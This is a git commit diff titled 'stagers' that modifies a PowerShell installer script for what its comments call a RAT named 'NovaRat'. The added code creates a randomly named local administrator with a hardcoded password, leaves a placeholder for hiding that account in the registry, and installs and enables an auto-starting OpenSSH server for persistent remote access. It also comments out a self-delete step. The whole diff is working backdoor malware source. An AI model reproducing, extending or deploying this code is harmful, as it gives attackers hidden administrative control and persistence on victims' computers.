694f81486f2c06639a19e1acd1c75f3ffaa83da4
fazelastblood <fazelastblood@gmail.com>
2024-01-21 15:41:20 -0600

    stagers

--- files/installer.ps1
+++ files/installer.ps1
@@ -6,18 +6,50 @@ function random_text {
     return -join((65..90)+(97..122) | Get-Random -Count 5 | % {[char]$_})
 }
 
+# create local admin for rat
+function create_account {
+    [CmdletBinding()]
+    param (
+        [string] $uname,
+        [securestring] $pword
+    )
+    begin {
+    }
+    process {
+        New-LocalUser "$uname" -pword $pword -FullName "$uname" -Description "Temporary local admin" 
+        Write-Verbose "$uname local user created"
+        Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+    }
+    end{
+    }
+}
+
+#create admin user
+$uname = random_text
+$pword = (ConvertTo-SecureString "NovaRat!" -AsPlainText -Force)
+create_account -uname $uname -pword $pword
+
+#registry to hide local admin
+
+
 ## variables
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
+#enabling persistent ssh
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+Get-NetFirewallRule -Name *ssh*
+
+#
+
 #goto temp, make working directory
 mkdir $path
 cd $path
 
-
-
 # self delete
-cd $initial_dir
-del installer.ps1
+# cd $initial_dir
+# del installer.ps1
 
